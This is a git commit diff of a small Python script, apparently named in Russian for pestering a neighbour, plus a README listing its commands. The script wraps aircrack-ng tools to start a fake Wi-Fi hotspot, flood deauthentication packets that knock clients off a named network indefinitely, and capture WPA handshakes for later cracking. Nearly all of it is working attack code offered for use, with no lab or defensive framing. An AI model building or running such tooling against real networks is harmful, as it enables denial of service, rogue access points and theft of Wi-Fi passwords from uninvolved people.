080dbeefe1d9ca8a321fc639ab9d12a411d1f205
Man1nHat <popryvoon100@gmail.com>
2018-07-06 17:42:06 +0000

    Fixed bugs

---
+++ README.md
@@ -0,0 +1,6 @@
+Commands:
+fake-hot-spot - this command is used to create fake hot spot
+
+deauth - this command is used to send deauth packets and disconnect clients
+
+hack - this command is used to get handshake.
--- kak-dostat-soseda.py
+++ kak-dostat-soseda.py
@@ -1,28 +1,32 @@
-from subprocess import *
+from subprocess import call
 
-answ = input("->")
+try:
+    answ = input("-> ")
+    if answ == "fake-hot-spot":
+        name = input("Enter name of fake wifi hot spot: ")
+        mac = input("Enter mac address of fake wifi hot spot: ")
+        ch = input("Enter channel number of fake wifi hot spot: ")
+        call(["iwconfig"])
+        adapter = input("Enter name of your network adapter: ")
+        call(["airmon-ng", "start", adapter])
+        adapter = adapter + "mon"
+        call(["airbase-ng", "-a", mac, "--essid", name, "-c", ch, adapter])
 
-if answ == "fake-hot-spot":
-    name = input("Enter name of fake wifi hot spot: ")
-    mac = input("Enter mac address of fake wifi hot spot: ")
-    ch = input("Enter channel number of fake wifi hot spot: ")
-    call(["iwconfig"])
-    adapter = input("Enter name of your network adapter: ")
-    call(["airmon-ng", "start", adapter])
-    adapter = adapter + "mon"
-    call(["airbase-ng", "-a", mac, "--essid", name, "-c", ch, adapter])
+    if answ == "deauth":
+        call(["airmon-ng"])
+        adapter = input("Enter name of your network adapter: ")
+        call(["airmon-ng", "start", adapter])
+        adapter = adapter + "mon"
+        name = input("Enter deauth essid: ")
+        call(["aireplay-ng", "-0", "0", "-e", name, adapter])
 
-if answ == "deauth":
-    call(["iwconfig"])
-    adapter = input("Enter name of your network adapter: ")
-    call(["airmon-ng", "start", adapter])
-    adapter = adapter + "mon"
-    mac = input("Enter deauth mac: ")
-    call(["aireplay-ng", "-0", "5", "-a", mac, adapter])
-
-if answ == "hack":
-    call(["iwconfig"])
-    adapter = input("Enter name of your network adapter: ")
-    ch = input("Enter channel: ")
-    adapter = adapter + "mon"
-    call(["airodump-ng", adapter, "--channel", ch, "-w", "cap2"])
+    if answ == "hack":
+        call(["airmon-ng"])
+        adapter = input("Enter name of your network adapter: ")
+        call(["airmon-ng", "start", adapter])
+        ch = input("Enter channel: ")
+        adapter = adapter + "mon"
+        call(["airodump-ng", adapter, "--channel", ch, "-w", "cap2"])
+except KeyboardInterrupt:
+    call(["airmon-ng", "stop", adapter])
+    print("Bye")
